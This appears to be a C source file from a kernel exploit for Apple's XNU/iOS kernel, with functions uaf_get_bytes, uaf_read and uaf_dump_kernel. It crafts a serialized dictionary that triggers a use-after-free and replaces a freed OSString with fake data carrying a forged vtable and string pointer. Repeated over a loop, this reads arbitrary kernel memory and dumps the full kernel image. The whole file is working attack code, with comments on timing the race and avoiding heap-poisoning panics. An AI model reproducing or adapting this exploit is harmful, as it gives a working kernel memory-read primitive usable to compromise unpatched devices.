#include <errno.h>              // errno
#include <stddef.h>             // size_t
#include <stdint.h>             // uint32_t
#include <stdlib.h>             // malloc
#include <string.h>             // memset, strerror
#include <unistd.h>             // usleep

#include "common.h"             // ASSERT, DEBUG, ERROR, PRINT_BUF, ADDR, addr_t, MACH_MAGIC, mach_hdr_t, mach_seg_t
#include "io.h"                 // MIG_MSG_SIZE, kOS*, OSString, dict_get_bytes
#include "slide.h"              // get_kernel_slide

#include "uaf_read.h"

void uaf_get_bytes(const OSString *fake, char *buf, size_t len)
{
    DEBUG("Using UAF to read kernel bytes...");

    const uint32_t *data = (const uint32_t*)fake;
    PRINT_BUF("Data", data, sizeof(OSString));

    uint32_t buflen = (uint32_t)len;
    const char str[4] = "str",
               ref[4] = "ref",
               sav[4] = "sav";
    uint32_t dict[11 + sizeof(OSString) / sizeof(uint32_t)] =
    {
        kOSSerializeMagic,                                              // Magic
        kOSSerializeEndCollection | kOSSerializeDictionary | 6,         // Dictionary with 6 entries

        kOSSerializeString | 4,                                         // String that will get freed
        *((uint32_t*)str),
        kOSSerializeData | sizeof(OSString),                            // OSData with same size as OSString
#ifdef __LP64__
        data[0],                                                        // vtable pointer (lower half)
        data[1],                                                        // vtable pointer (upper half)
        data[2],                                                        // retainCount
        data[3],                                                        // flags
        data[4],                                                        // length
        data[5],                                                        // (padding)
        data[6],                                                        // string pointer (lower half)
        data[7],                                                        // string pointer (upper half)
#else
        data[0],                                                        // vtable pointer
        data[1],                                                        // retainCount
        data[2],                                                        // flags
        data[3],                                                        // length
        data[4],                                                        // string pointer
#endif

        kOSSerializeSymbol | 4,                                         // Name that we're gonne use to retrieve bytes
        *((uint32_t*)ref),
        kOSSerializeObject | 1,                                         // Reference to the overwritten OSString

        kOSSerializeSymbol | 4,                                         // Create a reference to the OSData to prevent it
        *((uint32_t*)sav),                                              // from being freed before the OSString, which
        kOSSerializeEndCollection | kOSSerializeObject | 2,             // would cause a panic (because heap poisoning).
    };
    PRINT_BUF("Dict", dict, sizeof(dict));

/*    uint32_t *buf = malloc(bufsize);
    if(buf == NULL)
    {
        ERROR("Failed to allocate buffer (%s)", strerror(errno));
    }*/

    dict_get_bytes(dict, sizeof(dict), ref, buf, &buflen);

    PRINT_BUF("Fetched bytes", (uint32_t*)buf, buflen);

    //free(buf);
}

void uaf_read(const char *addr, char *buf, size_t len)
{
    DEBUG("Dumping kernel bytes " ADDR "-" ADDR "...", (addr_t)addr, (addr_t)(addr + len));

    size_t kslide = get_kernel_slide();
    OSString osstr =
    {
        .vtab = (vtab_t)(0xffffff80044ef1f0 + kslide),  // TODO: hardcoded
        .retainCount = 100,                             // don't try to free this
        .flags = kOSStringNoCopy,                       // and neither the "string" it points to
    };

    verbose = false;
    for(size_t off = 0; off < len; off += osstr.length)
    {
        osstr.length = len - off;
        osstr.length = osstr.length > MIG_MSG_SIZE ? MIG_MSG_SIZE : osstr.length;
        osstr.string = &addr[off];
        //DEBUG(ADDR " %08x", (addr_t)osstr.string, osstr.length);
        //fprintf(stderr, "\r" ADDR " %08x", (addr_t)osstr.string, osstr.length);
        // For some reason we have to slow the process down artificially in order to gain stability.
        // I guess this has something to do with the UaF being a race condition.
        usleep(100);
        uaf_get_bytes(&osstr, &buf[off], osstr.length);
    }
    verbose = true;
    //fprintf(stderr, "\n");
}

void uaf_dump_kernel(file_t *file)
{
    DEBUG("Dumping kernel...");

    char *hbuf = malloc(MIG_MSG_SIZE),
         *newhbuf = malloc(MIG_MSG_SIZE);
    if(hbuf == NULL || newhbuf == NULL)
    {
        ERROR("Failed to allocate buffer (%s)", strerror(errno));
    }
    memset(newhbuf, 0, MIG_MSG_SIZE);

    char *kbase = (char*)(0xffffff8004004000 + get_kernel_slide());
    uaf_read(kbase, hbuf, MIG_MSG_SIZE);
    //uint32_t *header = (uint32_t*)hbuf;
    //PRINT_BUF("Kernel header", header, MIG_MSG_SIZE);

    mach_hdr_t *hdr = (mach_hdr_t*)hbuf;
    ASSERT(MACH_MAGIC == hdr->magic);
    memcpy(newhbuf, hbuf, sizeof(*hdr));
    mach_hdr_t *newhdr = (mach_hdr_t*)newhbuf;
    newhdr->ncmds = 0;
    newhdr->sizeofcmds = 0;

    size_t filesize = 0;
    DEBUG("Kernel segments:");
    for(mach_cmd_t *cmd = (mach_cmd_t*)&hdr[1], *end = (mach_cmd_t*)((char*)cmd + hdr->sizeofcmds); cmd < end; cmd = (mach_cmd_t*)((char*)cmd + cmd->cmdsize))
    {
        switch(cmd->cmd)
        {
            case LC_SEGMENT:
            case LC_SEGMENT_64:
                {
                    mach_seg_t *seg = (mach_seg_t*)cmd;
                    size_t size = seg->fileoff + seg->filesize;
                    filesize = size > filesize ? size : filesize;
                    DEBUG("Mem: " ADDR "-" ADDR " File: " ADDR "-" ADDR "     %-31s", seg->vmaddr, seg->vmaddr + seg->vmsize, seg->fileoff, seg->fileoff + seg->filesize, seg->segname);
                    for(uint32_t i = 0; i < seg->nsects; ++i)
                    {
                        mach_sec_t *sec = &( (mach_sec_t*)&seg[1] )[i];
                        DEBUG("    Mem: " ADDR "-" ADDR " File: " ADDR "-" ADDR " %s.%-*s", sec->addr, sec->addr + sec->size, (addr_t)sec->offset, sec->offset + sec->size, sec->segname, (int)(30 - strlen(sec->segname)), sec->sectname);
                    }
                }
                break;
        }
    }

    DEBUG("Kernel file size: 0x%lx", filesize);
    char *buf = malloc(filesize);
    if(buf == NULL)
    {
        ERROR("Failed to allocate buffer (%s)", strerror(errno));
    }

    //verbose = false;
    for(mach_cmd_t *cmd = (mach_cmd_t*)&hdr[1], *end = (mach_cmd_t*)((char*)cmd + hdr->sizeofcmds); cmd < end; cmd = (mach_cmd_t*)((char*)cmd + cmd->cmdsize))
    {
        switch(cmd->cmd)
        {
            case LC_SEGMENT:
            case LC_SEGMENT_64:
                {
                    mach_seg_t *seg = (mach_seg_t*)cmd;
                    DEBUG("Dumping %s...", seg->segname);
                    uaf_read((char*)seg->vmaddr, &buf[seg->fileoff], seg->filesize);
                }
            case LC_UUID:
            case LC_UNIXTHREAD:
            case LC_VERSION_MIN_IPHONEOS:
            case LC_FUNCTION_STARTS:
            case LC_SOURCE_VERSION:
                {
                    memcpy(newhbuf + sizeof(*hdr) + newhdr->sizeofcmds, cmd, cmd->cmdsize);
                    newhdr->sizeofcmds += cmd->cmdsize;
                    newhdr->ncmds++;
                }
                break;
        }
    }
    //verbose = true;

    memcpy(buf, newhbuf, sizeof(*hdr) + hdr->sizeofcmds);

    //uaf_read(kbase, buf, len);
    free(hbuf);
    free(newhbuf);

    file->buf = buf;
    file->len = filesize;
    /*return (file_t) {
        .buf = buf,
        .len = filesize,
    };*/
}
